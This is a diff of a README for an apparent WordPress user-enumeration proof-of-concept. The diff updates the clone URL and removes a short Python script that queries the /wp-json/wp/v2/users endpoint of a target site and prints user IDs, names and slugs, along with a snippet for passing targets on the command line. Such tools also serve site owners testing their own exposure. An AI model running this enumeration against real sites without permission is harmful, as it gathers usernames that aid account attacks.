@@ -13,7 +13,7 @@ Installation
 bash
 
 # Clone the repository
-git clone https://github.com/Maimoharris/wordpress-user-enumeration-poc.git
+git clone https://github.com/Maimoharris/WPUserEnum.git
 cd wordpress-user-enumeration-poc
 
 # Install dependencies
@@ -33,17 +33,6 @@ bash
 
 python wordpress_user_enum.py
 
-Advanced Usage (Command Line Arguments)
-
-Modify the script to accept dynamic targets:
-python
-
-import sys
-
-if len(sys.argv) > 1:
-    web_site = sys.argv[1]
-else:
-    web_site = "https://default-target.com/"
 
 🎯 Features
 
@@ -78,29 +67,6 @@ Secure Site
 text
 
 Website is NOT Vulnerable
-
-🔧 Script Code
-python
-
-# WordPress User Enumeration PoC Script
-# Author: Maimo Harris
-import json
-import requests
-
-web_site = "https://www.targetsite.com/"
-endpoint = "/wp-json/wp/v2/users"
-url = f"{web_site}{endpoint}"
-
-response = requests.get(url)
-if response.status_code == 200:
-    print("Website is Vulnerable to User Enumeration!")
-    json_data = response.json()
-    for users in json_data:
-        print(f"User ID: {users['id']}")
-        print(f"User Name: {users['name']}")
-        print(f"User Slug: {users['slug']}\n")
-else:
-    print("Website is NOT Vulnerable")
 
 🛡️ Use Cases
 
